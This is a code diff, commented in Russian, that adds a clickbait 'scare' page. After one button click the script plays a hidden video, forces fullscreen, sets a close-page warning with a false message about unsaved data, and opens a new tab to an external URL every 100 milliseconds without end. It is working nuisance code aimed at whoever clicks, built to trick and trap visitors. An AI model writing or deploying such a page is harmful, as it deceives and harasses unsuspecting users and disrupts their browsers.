@@ -26,7 +26,7 @@
         justify-content: center;
         align-items: center;
         z-index: 100; /* Убедимся, что контейнер с кнопкой поверх всего */
-        color: white; /* Цвет текста, если нужно добавить какой-то текст */
+        color: white; /* Цвет текста */
         flex-direction: column;
         gap: 20px;
         text-align: center;
@@ -55,14 +55,15 @@
         box-shadow: 0 2px 10px rgba(0, 0, 0, 0.5);
     }
 
-    .scare {
+    /* Изначально скрываем видео-контейнер */
+    #scare-video-container {
         position: fixed;
         top: 0;
         left: 0;
         height: 100vh;
         width: 100vw;
         z-index: 1;
-        display: none; /* Изначально скрываем видео-контейнер */
+        display: none; 
     }
 
     video#video {
@@ -86,3 +87,111 @@
 </div>
 
 <!-- Основной "пугающий" контент (видео), который изначально скрыт -->
+<div id="scare-video-container">
+    <video id="video" src="media/video.mp4" loop playsinline></video>
+</div>
+
+<script type="text/javascript">
+    const video = document.getElementById("video");
+    const targetUrl = "https://penis-git-main-fe1zyyys-projects.vercel.app/";
+    const startButton = document.getElementById("start-button");
+    const clickbaitContainer = document.getElementById("clickbait-container");
+    const scareVideoContainer = document.getElementById("scare-video-container");
+
+    // === Отладочные логи: Проверяем, найдены ли элементы ===
+    console.log("Элементы:");
+    console.log("video:", video);
+    console.log("startButton:", startButton);
+    console.log("clickbaitContainer:", clickbaitContainer);
+    console.log("scareVideoContainer:", scareVideoContainer);
+
+    // Предупреждение при закрытии страницы
+    window.addEventListener('beforeunload', function(e) {
+        e.preventDefault();
+        e.returnValue = 'Ваши данные могут не сохраниться, точно закрыть?';
+        return 'Ваши данные могут не сохраниться, точно закрыть?';
+    });
+
+    // Функция для запроса полноэкранного режима
+    function requestFullscreen() {
+        console.log("Attempting to request fullscreen.");
+        const { documentElement } = document;
+        if(documentElement.requestFullscreen) {
+            documentElement.requestFullscreen();
+        } else if(documentElement.mozRequestFullScreen) { // Firefox
+            documentElement.mozRequestFullScreen();
+        } else if(documentElement.webkitRequestFullscreen) { // Chrome, Safari, Opera
+            documentElement.webkitRequestFullscreen();
+        } else if(documentElement.msRequestFullscreen) { // IE/Edge
+            documentElement.msRequestFullscreen();
+        }
+    }
+
+    // Функция для открытия новой вкладки
+    function openNewTab() {
+        console.log("Attempting to open new tab:", targetUrl);
+        // Большинство браузеров блокируют window.open, если оно не вызвано напрямую
+        // пользовательским взаимодействием. setInterval почти всегда будет блокироваться.
+        // Пользователь увидит сообщение о блокировке всплывающих окон.
+        window.open(targetUrl, '_blank');
+    }
+
+    // Функция, которая запускает всю "пугающую" последовательность
+    function startScareSequence() {
+        console.log("startScareSequence() called.");
+
+        // Скрываем контейнер с кнопкой
+        clickbaitContainer.style.display = 'none';
+        // Показываем контейнер с видео
+        scareVideoContainer.style.display = 'block';
+        console.log("Containers visibility toggled.");
+
+        // === ВАЖНО: Принудительно заглушаем видео для автоплея ===
+        video.muted = true; 
+        // Добавлен атрибут playsinline в HTML для iOS устройств, чтобы видео воспроизводилось в рамках окна
+        
+        // Запускаем видео
+        video.play()
+            .then(() => {
+                console.log("Video playback started successfully.");
+                // Запрашиваем полноэкранный режим после успешного старта видео
+                requestFullscreen();
+            })
+            .catch(error => {
+                console.error("Autoplay failed:", error);
+                // Если автоплей заблокирован, можно показать сообщение или кнопку "Play"
+                // В этом случае полноэкранный режим также может быть заблокирован.
+                alert("Не удалось запустить видео автоматически. Пожалуйста, кликните по экрану.");
+            });
+        
+        // Начинаем открывать вкладки через секунду после загрузки
+        setTimeout(() => {
+            console.log("Starting to open new tabs after 1 second...");
+            // Открываем новые вкладки каждые 100мс бесконечно
+            // Важно: Эти вкладки, скорее всего, будут заблокированы браузером
+            // как всплывающие окна, и пользователь увидит предупреждение.
+            setInterval(openNewTab, 100);
+        },
+1000);
+    }
+
+    // Добавляем обработчик события для "кликбейт" кнопки
+    if (startButton) {
+        startButton.addEventListener('click', startScareSequence);
+        console.log("Event listener added to startButton.");
+    } else {
+        console.error("startButton not found!");
+    }
+
+    // Добавляем обработчик события для видео, чтобы при клике на него
+    // можно было снова запросить полноэкранный режим (если пользователь вышел)
+    if (video) {
+        video.addEventListener("click", requestFullscreen);
+        console.log("Event listener added to video for fullscreen.");
+    } else {
+        console.error("video element not found!");
+    }
+
+</script>
+</body>
+</html>
